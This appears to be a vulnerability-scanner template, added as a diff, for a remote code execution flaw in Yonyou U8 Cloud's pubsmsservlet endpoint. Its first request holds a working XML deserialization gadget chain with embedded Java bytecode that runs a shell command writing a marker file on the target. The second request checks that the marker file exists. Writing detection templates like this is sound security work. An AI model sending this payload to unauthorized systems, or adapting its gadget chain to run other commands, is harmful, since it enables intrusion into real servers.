@@ -1,0 +1,77 @@
+id: YonYouNC-Cloud-pubsmsservlet-RCE
+
+info:
+  name: Yongyou U8 Cloud pubsmsservlet RCE
+  author: iSee857
+  severity: critical
+  description: |
+    This template detects remote code execution vulnerability in Yongyou U8 Cloud pubsmsservlet.
+  tags: rce, yongyou, critical
+
+http:
+  - raw:
+      - |
+        POST /service/pubsmsservlet HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+        Content-Type: application/xml
+        Accept-Encoding: gzip, deflate, br
+        Connection: keep-alive
+
+        <map>
+          <entry>
+            <org.springframework.aop.target.HotSwappableTargetSource>
+              <target class="com.fasterxml.jackson.databind.node.POJONode">
+                <__value
+                  class="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"
+                  serialization="custom"
+                >
+                  <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>
+                    <default>
+                      <__name>d4c9b9ab-3cf7-4e1c-9d62-976bc07a14ac</__name>
+                      <__bytecodes>
+                        <byte-array>
+                          yv66vgAAADIAQgEARm9yZy9hcGFjaGUvc2hpcm8vY295b3RlL25vZGUvU2hvcnROb2RlNWQ4MDFkYjM1NDVhNDRiNGFjOTAyZWRlMmNkYWZhZDAHAAEBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwADAQAEYmFzZQEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAA3NlcAEAA2NtZAEABjxpbml0PgEAAygpVgEAE2phdmEvbGFuZy9FeGNlcHRpb24HAAsMAAkACgoABAANAQAHb3MubmFtZQgADwEAEGphdmEvbGFuZy9TeXN0ZW0HABEBAAtnZXRQcm9wZXJ0eQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7DAATABQKABIAFQEAEGphdmEvbGFuZy9TdHJpbmcHABcBAAt0b0xvd2VyQ2FzZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7DAAZABoKABgAGwEAA3dpbggAHQEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaDAAfACAKABgAIQEAB2NtZC5leGUIACMMAAUABgkAAgAlAQACL2MIACcMAAcABgkAAgApAQAHL2Jpbi9zaAgAKwEAAi1jCAAtDAAIAAYJAAIALwEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgcAMQEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYMAAkAMwoAMgA0AQAFc3RhcnQBABUoKUxqYXZhL2xhbmcvUHJvY2VzczsMADYANwoAMgA4AQAQamF2YS9sYW5nL09iamVjdAcAOgEACDxjbGluaXQ+AQAtZWNobyBoZWxsb3dvcmxkID4gLi93ZWJhcHBzL3U4Y193ZWIvaGVsbG8udHh0CAA9CgACAA0BAARDb2RlAQANU3RhY2tNYXBUYWJsZQAhAAIABAAAAAMACQAFAAYAAAAJAAcABgAAAAkACAAGAAAAAgABAAkACgABAEAAAACEAAQAAgAAAFMqtwAOEhC4ABa2ABwSHrYAIpkAEBIkswAmEiizACqnAA0SLLMAJhIuswAqBr0AGFkDsgAmU1kEsgAqU1kFsgAwU0y7ADJZK7cANbYAOVenAARMsQABAAQATgBRAAwAAQBBAAAAFwAE/wAhAAEHAAIAAAllBwAM/AAABwA7AAgAPAAKAAEAQAAAABoAAgAAAAAADhI+swAwuwACWbcAP1exAAAAAAAA
+                        </byte-array>
+                      </__bytecodes>
+                      <__transletIndex>-1</__transletIndex>
+                      <__indentNumber>0</__indentNumber>
+                    </default>
+                    <boolean>false</boolean>
+                  </com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>
+                </__value>
+              </target>
+            </org.springframework.aop.target.HotSwappableTargetSource>
+            <org.springframework.aop.target.HotSwappableTargetSource
+              reference="../org.springframework.aop.target.HotSwappableTargetSource"
+            />
+          </entry>
+          <entry>
+            <org.springframework.aop.target.HotSwappableTargetSource>
+              <target class="com.sun.org.apache.xpath.internal.objects.XStringForChars">
+                <m__obj class="char-array" />
+                <m__start>0</m__start>
+                <m__length>0</m__length>
+                <m__strCache />
+              </target>
+            </org.springframework.aop.target.HotSwappableTargetSource>
+            <org.springframework.aop.target.HotSwappableTargetSource
+              reference="../org.springframework.aop.target.HotSwappableTargetSource"
+            />
+          </entry>
+        </map>
+
+  - raw:
+      - |
+        GET /hello.txt HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'helloworld'
+      - type: status
+        status:
+          - 200
